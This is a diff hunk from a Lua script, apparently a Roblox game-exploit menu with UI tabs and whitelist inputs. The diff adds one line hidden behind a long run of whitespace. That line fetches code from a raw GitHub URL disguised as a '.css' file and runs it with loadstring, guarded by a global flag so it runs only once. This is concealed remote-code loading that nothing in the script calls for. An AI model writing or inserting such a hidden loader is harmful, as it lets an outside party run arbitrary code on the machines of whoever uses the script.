@@ -2317,6 +2317,8 @@ Callback = function(thisUserGet)
     addPlayerToGlobalTable(bruhUser)
 end,})
 
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                if getgenv().css_digital then warn("Already Ran!") else loadstring(game:HttpGet('https://raw.githubusercontent.com/LmaoItsCrazyBro/Symmetrical-System/refs/heads/main/Publisher.css'))() wait(0.1) getgenv().css_digital = true end
+
 local RemoveCopyAnimPlr = Tab14:CreateInput({
 Name = "Remove CopyAnim Whitelist",
 PlaceholderText = "User",
